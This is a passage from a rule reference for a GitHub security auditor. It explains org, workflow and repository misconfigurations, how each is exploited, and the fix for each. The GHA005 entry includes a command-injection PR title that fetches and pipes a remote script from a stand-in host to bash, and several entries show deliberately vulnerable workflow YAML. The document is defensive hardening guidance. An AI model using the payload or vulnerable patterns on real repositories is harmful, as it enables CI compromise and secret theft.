# Rule reference

One entry per rule id, linked from the rule tables in
[`README.md`](../README.md#what-it-checks). The README stays a scannable index — id,
severity, one-line finding — and the detail lives here: what the unsafe configuration
actually looks like, what an attacker does with it, and the exact change that fixes it.
The rule classes themselves are the source of truth if this page and the code ever
disagree; each section names the module it documents.

**Format.** Every entry has the same four subsections, in this order: *Vulnerable
pattern* (the concrete unsafe value or setting, and where it lives), *Why it's
exploitable* (the attack the finding is warning about), *Fix* (the corrected value and
the settings path to change it), and *Further reading* (GitHub's own documentation for
that setting).

Remember that every posture field is tri-state. `None` means the token could not read the
setting — most organization settings need org-owner or `admin:org` read — and unknown is
never a finding. If a rule below never fires for your org, check the token's scopes before
concluding the setting is safe.

## Organization rules

Organization settings apply to *every* repository underneath them, including repositories
created tomorrow, so one misconfigured default is an org-wide exposure rather than a
single-repo one. Findings are attributed to the org rather than a repo and are reported
once per audit. Source:
[`src/github_auditor/analyze/rules/org_rules.py`](../src/github_auditor/analyze/rules/org_rules.py).

<a id="org001"></a>

### ORG001 — org-2fa-not-required

**Vulnerable pattern** — the organization does not require a second factor. The
organization API reports:

```yaml
# GET /orgs/{org}
two_factor_requirement_enabled: false
```

In the UI this is Organization Settings → Authentication security (`settings/security`),
with "Require two-factor authentication for everyone in the … organization" left
unchecked.

**Why it's exploitable** — account takeover is the most common route into a repository,
and without 2FA a password is the only thing between an attacker and write access. A
password reused in an unrelated breach dump, a credential-stuffing run, or a single
successful phish turns into a member session with whatever access that member has — which,
if [ORG002](#org002) is also open, is write on every repository. Nothing about this attack
requires the attacker to touch your code or your CI first; it is a login. The one control
blocks the entire class of attack, which is why it is graded high even though it is a
single checkbox.

**Fix** — Organization Settings → Authentication security → require two-factor
authentication for everyone. Give notice first: enabling it removes members and outside
collaborators who do not yet have 2FA, so announce a date and let people enrol before you
flip it.

**Further reading** —
[Requiring two-factor authentication in your organization](https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-two-factor-authentication-for-your-organization/requiring-two-factor-authentication-in-your-organization).

<a id="org002"></a>

### ORG002 — org-base-permission-write

**Vulnerable pattern** — the organization's base permission — the floor every member gets
on every repository — is `write` or `admin`:

```yaml
# GET /orgs/{org}
default_repository_permission: write # or: admin
```

In the UI this is Organization Settings → Member privileges
(`settings/member_privileges`) → Base permissions. The rule reports `write` as medium and
`admin` as high, because admin additionally allows disabling branch protection and
security features and deleting repositories outright.

**Why it's exploitable** — a single compromised member account can push anywhere in the
org, not just to the repositories that member works on, so the blast radius of one
phished laptop is the whole codebase. That radius grows automatically: every new hire and
every new repository widens it without anyone making a decision. It also defeats
per-repository access control — team grants become decoration on top of a floor that
already allows writes everywhere, so an access review that looks at team membership
reports an access level that is not the real one.

**Fix** — Organization Settings → Member privileges → Base permissions → set to Read (or
No permission), then grant write through teams on the repositories that actually need it.
Expect to add team grants as part of the same change: dropping the floor without them
removes write access people are relying on.

**Further reading** —
[Setting base permissions for an organization](https://docs.github.com/en/organizations/managing-user-access-to-your-organizations-repositories/managing-repository-roles/setting-base-permissions-for-an-organization).

<a id="org003"></a>

### ORG003 — org-fork-pr-no-approval

**Vulnerable pattern** — the fork pull request approval policy requires approval only from
first-time contributors, so everyone else's fork PRs run unattended:

```yaml
# GET /orgs/{org}/actions/permissions/workflow
approval policy: first_time_contributors
# or: first_time_contributors_new_to_github
```

In the UI this is Organization Settings → Actions → General (`settings/actions`) → Fork
pull request workflows from outside collaborators. Only "Require approval for all outside
collaborators" closes the path; the two narrower settings above are what this rule
reports.

**Why it's exploitable** — anyone can fork a public repository, open a pull request, and
cause the organization's CI to execute their code with no human in the loop. On
GitHub-hosted runners that is compute abuse (cryptomining is the usual payload) plus a
probing foothold inside your build environment. Wherever a self-hosted runner is attached
it is worse: arbitrary code execution on org infrastructure, on a machine that usually has
network reach into the environment it deploys to and often keeps state between jobs. "One
approving click per stranger" is the entire mitigation, and it is the difference between a
build that a maintainer chose to run and one a stranger triggered.

**Fix** — Organization Settings → Actions → General → Fork pull request workflows →
require approval for all outside collaborators. Apply it at the org level so new
repositories inherit it rather than starting open.

**Further reading** —
[Approving workflow runs from public forks](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/approving-workflow-runs-from-public-forks).

<a id="org004"></a>

### ORG004 — org-default-token-write

**Vulnerable pattern** — the organization's default workflow permission is read/write, so
every job that declares no `permissions:` block starts with a writable token:

```yaml
# GET /orgs/{org}/actions/permissions/workflow
default_workflow_permissions: write
```

In the UI this is Organization Settings → Actions → General (`settings/actions`) →
Workflow permissions → "Read and write permissions".

**Why it's exploitable** — the default is what most workflows actually run with, because
most workflows never declare permissions at all. Under this setting each of them receives
a `GITHUB_TOKEN` that can push commits, move tags, and modify releases, so any code
execution inside any job — a compromised third-party action, an injected expression, a
malicious dependency in a build script — is immediately a write to the repository rather
than a read. This is what makes a missing permissions block ([GHA007](#gha007)) dangerous
rather than merely untidy: the two compound, and the org default decides which one it is.

**Fix** — Organization Settings → Actions → General → Workflow permissions → read
repository contents and packages permissions. Grant write back per job, in the workflows
that need it, with an explicit block:

```yaml
permissions:
  contents: read # job default
```

**Further reading** —
[Setting the permissions of the GITHUB_TOKEN for your organization](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#setting-the-permissions-of-the-github_token-for-your-organization)
and
[Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication).

<a id="org005"></a>

### ORG005 — org-actions-can-approve-prs

**Vulnerable pattern** — GitHub Actions is allowed to open and approve pull requests
across the organization:

```yaml
# GET /orgs/{org}/actions/permissions/workflow
can_approve_pull_request_reviews: true
```

In the UI this is Organization Settings → Actions → General (`settings/actions`) → "Allow
GitHub Actions to create and approve pull requests", checked.

**Why it's exploitable** — required-review branch protection assumes an approval comes
from a second human. This setting hands that approval to the `GITHUB_TOKEN`, so any
code-execution flaw in any workflow lets an attacker open a pull request and approve it
with the same token, then merge their own changes without a reviewer ever seeing them. The
weakness is org-wide: one vulnerable workflow in one repository is enough to defeat
required review everywhere the same token privilege applies. Bot-authored PRs that need an
approving review should get it from a reviewer or a separate identity, not from the
workflow that wrote them.

**Fix** — Organization Settings → Actions → General → uncheck "Allow GitHub Actions to
create and approve pull requests". If automation genuinely needs to open PRs, keep
creation in the hands of a GitHub App or dedicated account whose approvals still count as
a distinct reviewer under branch protection.

**Further reading** —
[Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-creating-or-approving-pull-requests).

<a id="org006"></a>

### ORG006 — org-members-create-public-repos

**Vulnerable pattern** — any member can create public repositories:

```yaml
# GET /orgs/{org}
members_can_create_public_repositories: true
```

In the UI this is Organization Settings → Member privileges
(`settings/member_privileges`) → Repository creation, with public repositories allowed for
all members.

**Why it's exploitable** — accidental public exposure of an internal codebase is a leading
source of leaked credentials and proprietary source, and the window is not long enough to
catch by hand: bots scrape new public repositories within minutes, so a repo that was
public for an afternoon must be treated as permanently disclosed, secrets rotated
included. The failure is a single mis-clicked radio button during repository creation, by
someone who is not thinking about disclosure at that moment. This is also how the aging,
unmaintained public repositories this tool exists to find enter an organization in the
first place.

**Fix** — Organization Settings → Member privileges → Repository creation → restrict
public repository creation to owners, or route creation through a request process. Members
can still create private (and, on the relevant plans, internal) repositories, so the
day-to-day workflow keeps working.

**Further reading** —
[Restricting repository creation in your organization](https://docs.github.com/en/organizations/managing-organization-settings/restricting-repository-creation-in-your-organization).

## Workflow rules

These rules read the parsed YAML of every file under `.github/workflows/`, so the vulnerable
pattern is a snippet you can match against your own workflows. Findings are attributed to
the repository and point at the file, the job, and where possible the step. Source:
[`src/github_auditor/analyze/rules/workflow_rules.py`](../src/github_auditor/analyze/rules/workflow_rules.py).

The triggers this family treats as dangerous are `pull_request_target`, `workflow_run` and
`issue_comment`: all three run in the context of the *base* repository — with its secrets
and its `GITHUB_TOKEN` — while being initiated by someone who may have no write access at
all. Most of what follows is a consequence of that one asymmetry.

<a id="gha001"></a>

### GHA001 — pwn-request

**Vulnerable pattern** — a workflow triggered by `pull_request_target` (or `issue_comment`)
checks out the pull request's head commit and then runs it:

```yaml
name: Label and test PRs
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # attacker's code
      - run: npm install && npm test # ...executed with base-repo secrets
```

The rule fires on `ref:` values containing `github.event.pull_request.head.sha`,
`github.event.pull_request.head.ref`, `github.head_ref`,
`github.event.pull_request.merge_commit_sha`, or `github.event.issue.number`.

**Why it's exploitable** — `pull_request_target` exists so that a fork PR can be labelled or
triaged with a privileged token; unlike `pull_request`, it runs the workflow from the base
branch with full access to repository secrets and a read/write `GITHUB_TOKEN`, and it needs
no approval. Checking out the head commit puts the attacker's code inside that privileged
context, and running *anything* from the checkout executes it: `npm install` alone is enough,
because a lifecycle script in the PR's own `package.json` runs before a single test does. The
payload does not have to be exotic — reading `${{ secrets.* }}` out of the environment and
posting them to an external host is the whole attack, and from there a stolen PAT or a
poisoned release is a second step. This is the "pwn request" chain, and it is graded critical
because a stranger with a fork button gets code execution with your secrets, with no
maintainer in the loop.

**Fix** — do not check out untrusted code in a privileged workflow. If the job needs the PR's
code, use the plain `pull_request` trigger, which runs without secrets and with a read-only
token:

```yaml
name: Test PRs
on: pull_request # no secrets, read-only token

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4 # defaults to the PR merge ref — safe here
      - run: npm install && npm test
```

If you genuinely need both the untrusted build and a privileged follow-up (posting a comment,
uploading coverage), split them: build in the `pull_request` workflow, upload the result as an
artifact, and do the privileged half in a separate `workflow_run` workflow that never executes
the artifact — see [GHA004](#gha004) for how to treat what comes back.

**Further reading** —
[Keeping your GitHub Actions and workflows secure: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
and
[Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).

<a id="gha002"></a>

### GHA002 — unpinned-action

**Vulnerable pattern** — a third-party action is referenced by a tag or branch, which the
action's owner can move at any time:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-vendor/setup-toolchain@v4 # mutable tag
      - uses: some-vendor/deploy-action@main # mutable branch — worse
```

Actions owned by your own organization and by the owners listed in
`trusted_action_owners` (`actions` and `github` by default, so `actions/checkout@v4` is not
reported) are exempt, as are `docker://` references and local (`./`) actions.
The rule reports one finding per unique unpinned action per repository, listing every use
site, and grades it high rather than medium when any of those sites sits in a workflow with a
dangerous trigger.

**Why it's exploitable** — `@v4` is a pointer, not a version. Whoever controls the action's
repository can repoint it, and the next workflow run fetches whatever it now points at and
executes it in your runner with your secrets — no pull request, no review, no notification.
That is not hypothetical: in the tj-actions/changed-files compromise (March 2025) an attacker
with access to the repository rewrote the existing tags to a commit that dumped runner memory
and printed CI secrets into public build logs, hitting thousands of repositories at once
simply because they had followed the documented `@vN` usage. The same shape follows from a
single phished maintainer account. Pinning does not make a bad action safe, but it makes the
code you audited the code you run.

**Fix** — pin to a full 40-character commit SHA and keep the human-readable version in a
trailing comment, so you can still tell at a glance what you are on:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # each ref is an immutable commit SHA; the comment says which release it is
      - uses: some-vendor/setup-toolchain@0dc2d1b4a3e5d9f6a1f0a4a3c9e5d8b7f6a1c2d3 # v4.1.2
      - uses: some-vendor/deploy-action@3f1e9a7c2b8d4e6f0a1b2c3d4e5f60718293a4b5 # v2.3.0
```

Enable Dependabot for `github-actions` so the pins get bumped (with a diff you can review)
rather than rotting, and add owners you genuinely trust to `trusted_action_owners` in the
config rather than suppressing the rule wholesale.

**Further reading** —
[Using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
and
[Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot).

<a id="gha003"></a>

### GHA003 — external-reusable-workflow

**Vulnerable pattern** — a job delegates to a reusable workflow that lives in another
account, by a mutable ref:

```yaml
jobs:
  deploy:
    uses: other-org/ci-templates/.github/workflows/reusable.yml@main # external owner, mutable ref
    secrets: inherit
```

The rule grades what it finds: an external owner with a mutable ref is high; your own
organization with a mutable ref is medium; an external owner pinned to a full commit SHA is
low and informational, because the ref cannot move under you.

**Why it's exploitable** — a called workflow is not a sandbox. It runs inside your run,
against your repository, with the `GITHUB_TOKEN` you grant it and with any secrets you pass
(`secrets: inherit` hands over all of them). A mutable ref means the code that runs is
whatever that branch or tag points at *this morning*, and the decision belongs to someone
outside your organization. Because reusable workflows are shared deliberately — that is their
point — one repointed ref in a popular template repository compromises every caller
simultaneously, which is the same supply-chain shape as [GHA002](#gha002) with a larger unit
of code and, usually, more secrets attached.

**Fix** — prefer a reusable workflow you own; where you must call someone else's, pin it to a
full commit SHA and review that code once, then pass only the secrets it needs:

```yaml
jobs:
  deploy:
    # other-org/ci-templates reusable.yml v1.4.0 — reviewed at this SHA
    uses: other-org/ci-templates/.github/workflows/reusable.yml@3f1e9a7c2b8d4e6f0a1b2c3d4e5f60718293a4b5
    permissions:
      contents: read
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }} # not `inherit`
```

**Further reading** —
[Reusing workflows](https://docs.github.com/en/actions/sharing-automations/reusing-workflows)
and
[Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).

<a id="gha004"></a>

### GHA004 — workflow-run-artifact

**Vulnerable pattern** — a `workflow_run`-triggered workflow downloads an artifact produced
by the run that triggered it, and consumes it while holding secrets:

```yaml
name: Comment on PR build
on:
  workflow_run:
    workflows: [Test PRs] # fork PRs trigger this
    types: [completed]

jobs:
  report:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/download-artifact@v4 # artifact built by untrusted code
        with:
          run-id: ${{ github.event.workflow_run.id }}
      - run: ./coverage/report.sh # executing attacker-supplied file content
```

The rule fires on a `download-artifact` step, or on a `run:` step that reads
`github.event.workflow_run`, inside a `workflow_run` workflow — one finding per job.

**Why it's exploitable** — `workflow_run` is the recommended way to split privileged work
away from untrusted code (see [GHA001](#gha001)), and it is only safe if you keep the split.
The triggering run may have been started by a fork PR, so every byte of its artifacts is
attacker-controlled: file contents, file names, and — because artifacts are zip archives —
paths that can traverse out of the extraction directory over something the next step will
execute. The privileged half runs with secrets and a write token, so executing or sourcing
that content hands the attacker exactly the position the split was meant to deny them.
Parsing it carelessly is enough too: interpolating a value read out of the artifact into a
shell command is [GHA005](#gha005) with extra steps.

**Fix** — treat the artifact as hostile data: extract to a scratch directory, validate the
shape before use, never execute it, and keep the consuming job's permissions to the single
scope it needs.

```yaml
jobs:
  report:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write # the one scope this job needs
    steps:
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
          path: ./untrusted # scratch dir, nothing executable lives here
      - name: Validate before use
        run: |
          # data only: no sourcing, no chmod +x, no shell interpolation of contents
          jq -e 'type == "object" and has("coverage")' ./untrusted/summary.json
```

**Further reading** —
[Events that trigger workflows: `workflow_run`](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_run)
and
[Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions).

<a id="gha005"></a>

### GHA005 — script-injection

**Vulnerable pattern** — an attacker-controllable context value is interpolated straight into
a `run:` script (or into the `script:` input of `actions/github-script`):

```yaml
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Reviewing PR: ${{ github.event.pull_request.title }}"
```

The same applies to `github.event.pull_request.body`, `github.head_ref`, issue and comment
bodies, and commit messages — anything an outsider can write.

**Why it's exploitable** — `${{ }}` expressions are substituted *before* the shell sees the
script, as plain text. The runner does not quote or escape them, so the PR title is not data
passed to `echo`; it becomes part of the command line. A pull request titled

```text
"; curl -s https://evil.example/x.sh | bash #
```

turns that one line into `echo "Reviewing PR: "; curl -s … | bash #"`, and the attacker has
arbitrary command execution on the runner with whatever the job holds: secrets in the
environment, the `GITHUB_TOKEN`, and any cloud credentials minted through OIDC. Opening a
pull request with a chosen title is the entire prerequisite, which is why this is graded
critical — and note it does not need `pull_request_target`, because any workflow that runs on
a branch push or issue comment can see attacker-authored text.

**Fix** — never interpolate untrusted context into a script body. Bind it to an intermediate
environment variable and let the shell read the variable, quoted:

```yaml
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }} # expression evaluated here...
        run: echo "Reviewing PR: $TITLE" # ...and the shell only ever sees a variable
```

The value still arrives in full; it just arrives as a string in the process environment
rather than as shell source text, so quoting it with `"$TITLE"` makes metacharacters inert.
For JavaScript steps, pass the value in through `env:` and read `process.env.TITLE` instead of
templating it into `script:`.

**Further reading** —
[Understanding the risk of script injections](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

<a id="gha006"></a>

### GHA006 — broad-write-permissions

**Vulnerable pattern** — the workflow hands its `GITHUB_TOKEN` more write access than the
work requires, either bluntly:

```yaml
name: Release
on: push

permissions: write-all # every scope, every job

jobs:
  build: { runs-on: ubuntu-latest, steps: [{ run: make }] }
  publish: { runs-on: ubuntu-latest, steps: [{ run: make publish }] }
```

or by combining a write grant with a trigger that carries untrusted input
(`pull_request_target`, `workflow_run`, `issue_comment`), which the rule grades high:

```yaml
on: pull_request_target

permissions:
  contents: write # write token + attacker-influenced run
```

A top-level write scope inherited by several jobs is also reported. Per-job write scopes
under safe triggers are least-privilege done right and are not flagged.

**Why it's exploitable** — token scope is the blast radius of every other bug in the
workflow. A script injection ([GHA005](#gha005)), a compromised action ([GHA002](#gha002)) or
a malicious build dependency all end at the same place: code running as the job, holding the
job's token. With `contents: write` that code can push commits and move tags — including the
tags of your own releases; with `packages: write` it can publish a poisoned artifact; with
`id-token: write` it can mint cloud credentials through OIDC and leave GitHub entirely. On a
dangerous trigger the attacker also partly controls when and with what input the job runs, so
the gap between "a vulnerability exists" and "the repository is modified" closes.

**Fix** — default the whole workflow to read, then grant exactly what each job needs where it
needs it:

```yaml
name: Release
on: push

permissions:
  contents: read # least-privilege floor for every job

jobs:
  build:
    runs-on: ubuntu-latest
    steps: [{ run: make }]
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # the only job that publishes
    steps: [{ run: make publish }]
```

**Further reading** —
[Assigning permissions to jobs](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/control-permissions-for-github_token)
and
[Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication).

<a id="gha007"></a>

### GHA007 — missing-permissions-block

**Vulnerable pattern** — the workflow declares no permissions block at all, at either level:

```yaml
name: CI
on: push

# no `permissions:` key here...

jobs:
  build:
    runs-on: ubuntu-latest
    # ...and none here either
    steps:
      - uses: actions/checkout@v4
      - run: make test
```

The rule only fires when neither the workflow nor every one of its jobs declares
`permissions:`.

**Why it's exploitable** — what the token can do is then decided elsewhere: by the repository
setting, falling back to the organization default ([ORG004](#org004)). On repositories created
before February 2023, and on any org that never changed the default, that fallback is
read/write — so a workflow that only runs tests is nevertheless holding a token that can push
to the default branch. Nothing here is exploitable on its own; the point is that the file
gives you no way to know, and the answer can change without the workflow changing, when
someone flips an org setting or the repository is transferred. An explicit block turns an
inherited, invisible grant into a reviewable line of code. That is why this is low on its own
and why it compounds with everything in [GHA006](#gha006).

**Fix** — state the floor explicitly in every workflow, and add scopes per job as needed:

```yaml
name: CI
on: push

permissions:
  contents: read # explicit, and independent of the org default

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
```

**Further reading** —
[Controlling permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/control-permissions-for-github_token).

<a id="gha008"></a>

### GHA008 — callable-workflow-permissions

**Vulnerable pattern** — a reusable workflow, one triggered by `workflow_call`, asks for
write scopes (or declares nothing, leaving the caller's context to decide):

```yaml
name: Reusable build
on: workflow_call

permissions:
  contents: write # every caller inherits this

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
```

A write grant is reported at medium whether it sits at workflow or job level; a missing block
on a `workflow_call` workflow is low.

**Why it's exploitable** — a reusable workflow is a shared dependency, so its permissions are
not one file's problem. The permissions a called workflow ends up with are bounded by the
caller's token, but the callee's block is what is actually requested — and because the point
of this file is to be called from many repositories, one over-broad request propagates
everywhere it is used. A build step that only needs to read source but runs with
`contents: write` in twenty repositories means any code execution inside it — a dependency,
an unpinned action — is twenty repositories an attacker can push to rather than one. With no
block at all, the effective scope silently varies by caller, so the same file is safe in one
repository and privileged in the next, and nobody reviewing it can tell which.

**Fix** — pin reusable workflows to an explicit read-only floor and make callers grant
anything more, at the call site where the extra privilege is visible:

```yaml
name: Reusable build
on: workflow_call

permissions:
  contents: read # least privilege; callers grant more if they must

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
```

**Further reading** —
[Reusing workflows: access and permissions](https://docs.github.com/en/actions/sharing-automations/reusing-workflows#access-to-reusable-workflows)
and
[Controlling permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/control-permissions-for-github_token).

## Repository rules

These rules read a repository's settings and posture — visibility, branch protection,
runner registration, Actions configuration — rather than the contents of a workflow file,
so the vulnerable pattern is usually a value in the API response and a checkbox on the
repository's Settings pages. Three of them ([REPO001](#repo001), [REPO004](#repo004),
[REPO005](#repo005)) additionally look at whether workflows exist, because a setting only
matters when something actually runs under it. Source:
[`src/github_auditor/analyze/rules/repo_rules.py`](../src/github_auditor/analyze/rules/repo_rules.py).

<a id="repo001"></a>

### REPO001 — public-self-hosted-runner

**Vulnerable pattern** — a public repository with self-hosted runners attached. The rule
fires on either half of that: runners registered against the repo
(`Settings → Actions → Runners`, `settings/actions/runners`, reported critical), or —
when the token cannot see the registration — a workflow job asking for one by label
(reported high):

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, x64] # on a public repository
    steps:
      - uses: actions/checkout@v4
      - run: make build
```

`self-hosted` is the label GitHub adds to every self-hosted runner automatically, so it is
the reliable marker even when the other labels are custom.

**Why it's exploitable** — anyone can fork a public repository and open a pull request, and
a pull request can change the workflow it runs. On GitHub-hosted runners the machine is
destroyed after the job, so the damage is bounded; a self-hosted runner is persistent
infrastructure sitting inside your network. The attacker's code runs as the runner's
service account and can install a backdoor in the runner's own tooling, poison the build
caches and `~/.npmrc`/`~/.docker/config.json` style credentials left behind by previous
jobs, read whatever the next job checks out, and probe the internal network from a host
that is usually allowed to reach it. Because the runner survives between jobs, it also
gets to wait: the code planted by a stranger's PR is still there when the next release
build runs with real secrets. GitHub's own documentation says plainly not to use
self-hosted runners on public repositories, which is why this is the one critical in this
family. [ORG003](#org003) is the related control — requiring approval for fork PRs — but
approval is a human in the loop, not a boundary, and one distracted click restores the
attack.

**Fix** — do not attach self-hosted runners to public repositories. In order of
preference: move the job to GitHub-hosted runners (`runs-on: ubuntu-latest`); make the
repository private if the code does not need to be public; or, if you run runner groups at
the org level, restrict the group to private repositories under
`Organization Settings → Actions → Runner groups`. Removing the registration is the
change that actually closes it — editing `runs-on:` in the default branch does not, since
a fork's pull request supplies its own workflow file.

**Further reading** —
[Self-hosted runner security](https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/manage-access#about-self-hosted-runner-security)
and
[Security hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use#hardening-for-self-hosted-runners).

<a id="repo002"></a>

### REPO002 — no-branch-protection

**Vulnerable pattern** — the default branch has no protection rule at all:

```text
GET /repos/{owner}/{repo}/branches/{branch}/protection → 404 Branch not protected
```

In the UI this is `Settings → Branches` (`settings/branches`) with no rule matching the
default branch. The rule is graded high on public repositories and medium on private ones,
and it skips archived repositories, where nothing can be pushed anyway.

**Why it's exploitable** — an unprotected default branch means a single credential is the
whole control. Any account with write access — or any leaked PAT, any compromised CI
token, any action running with `contents: write` ([GHA006](#gha006), [REPO006](#repo006))
— can push straight to the branch that releases are cut from, that other repositories pin
to, and that deploy pipelines trust. There is no second pair of eyes and no required
status check, so a change that nobody reviewed and that fails tests can be the branch tip.
The attacker does not need to be subtle either: force pushes let them rewrite history so
the injected commit does not stand out in the log, which is the difference between an
incident you find in an afternoon and one you find in an audit months later.

**Fix** — `Settings → Branches → Add branch ruleset` (or a classic branch protection rule)
targeting the default branch, with at minimum: require a pull request before merging with
at least one approving review, require status checks to pass, and block force pushes and
deletions. Rulesets are the current mechanism and can be defined once at the organization
level and applied to every repository, which is the practical way to fix this across an
org rather than repository by repository.

**Further reading** —
[About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
and
[About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets).

<a id="repo003"></a>

### REPO003 — weak-branch-protection

**Vulnerable pattern** — a protection rule exists, but one or more of its teeth are
missing. The rule reports whichever of these it finds, listing them in the finding's
evidence:

```yaml
# GET /repos/{owner}/{repo}/branches/{branch}/protection
required_pull_request_reviews:
  required_approving_review_count: 0 # "no required reviews"
allow_force_pushes: { enabled: true } # "force pushes allowed"
allow_deletions: { enabled: true } # "branch deletion allowed"
```

In the UI: `Settings → Branches` → the rule on the default branch → "Require approvals"
set to 0, plus the "Allow force pushes" and "Allow deletions" checkboxes.

**Why it's exploitable** — this is the failure mode where the repository looks protected in
a checklist and is not. With zero required approvals, "require a pull request before
merging" only forces the change through a PR — the same person can open it and merge it
seconds later, so the review gate is a formality. Allowing force pushes is worse than it
sounds: code that *was* reviewed can be replaced after the fact, so an attacker (or a
well-meaning developer with a bad rebase) can rewrite the branch so that what is deployed
is no longer what was approved, and the evidence of the original commits disappears with
it. Allowing deletion lets the branch be removed outright, which on a default branch
takes the protection rule and its history with it. Each one individually turns a reviewed
branch back into an unreviewed one; this is graded medium rather than high only because
something is still standing between an attacker and the branch.

**Fix** — on the default branch's rule: set required approvals to at least 1 (2 for
branches that release), require status checks to pass before merging, and uncheck both
"Allow force pushes" and "Allow deletions". Consider also requiring review from code
owners and dismissing stale approvals on new pushes, so an approval cannot be recycled
onto different code.

**Further reading** —
[About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
and
[Available rules for rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets).

<a id="repo004"></a>

### REPO004 — stale-repo-actions-enabled

**Vulnerable pattern** — a repository whose last push is older than
`GITHUB_AUDITOR_STALE_YEARS` (default 2), which still has workflow files and still has
Actions enabled:

```text
pushed_at: 2021-03-04          # older than the stale threshold
actions_enabled: true          # Settings → Actions → General
.github/workflows/*.yml        # and workflows are still present
```

The rule skips archived repositories and anything where Actions is explicitly disabled;
it reports high on public repositories and medium on private ones. The threshold is
tunable — see `GITHUB_AUDITOR_STALE_YEARS` in the Configuration table in
[`README.md`](../README.md#configuration).

**Why it's exploitable** — nothing about a stale repository is safe *because* it is
stale; it is an attack surface that nobody is watching. Its workflows still run on
`schedule`, `issue_comment` or fork pull requests, still hold whatever secrets were
configured years ago, and still use action versions and runner images from an era of
known-vulnerable releases. Every other rule on this page applies to it — an unpinned
action ([GHA002](#gha002)), a write token ([REPO006](#repo006)), a self-hosted runner
([REPO001](#repo001)) — except that here no maintainer reads the PR notifications, no
Dependabot bump is merged, and a workflow run that starts behaving strangely produces no
alert. Attackers look for exactly this: the repository with real org secrets and no
audience.

**Fix** — decide it is dead and act like it. Archiving the repository
(`Settings → General → Danger Zone → Archive this repository`) makes it read-only and
disables Actions in one step, which is the cleanest outcome. If it must stay writable,
turn Actions off at `Settings → Actions → General → Actions permissions → Disable
actions`. If it is actually still in use, the fix is to bring it back under maintenance —
and then this finding is telling you the `pushed_at` date is lying about how much
attention it gets.

**Further reading** —
[Archiving a GitHub repository](https://docs.github.com/en/repositories/archiving-a-github-repository/archiving-repositories)
and
[Disabling or limiting GitHub Actions for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository).

<a id="repo005"></a>

### REPO005 — archived-public-workflows

**Vulnerable pattern** — an archived repository that is still public and still contains
workflow files:

```text
archived: true
visibility: public
.github/workflows/*.yml        # n workflow file(s) still in the tree
```

**Why it's exploitable** — this is the lowest-severity rule here because archiving does
disable Actions: the workflows do not run while the repository stays archived. What they
still do is sit in public, readable by anyone, describing your CI patterns — runner
labels, internal hostnames and registry URLs, secret names, deployment steps, the shape of
your build infrastructure — from a period when nobody was reviewing them for disclosure.
And the mitigation is one click deep: unarchiving the repository restores Actions with the
old workflow files intact, and forking copies them into a repository where Actions can be
enabled by the forker. So the finding is about a dormant configuration that becomes live
without anyone re-reviewing it, plus the reconnaissance value in the meantime.

**Fix** — for long-dead repositories, reduce exposure rather than leave it: make the
repository private (`Settings → General → Danger Zone → Change repository visibility`, which
works on archived repos — it does not require unarchiving), or delete it if nothing depends
on the URL. If it stays public for reference, unarchive it briefly, strip the workflow
files and any secrets referenced in them, then archive it again.

**Further reading** —
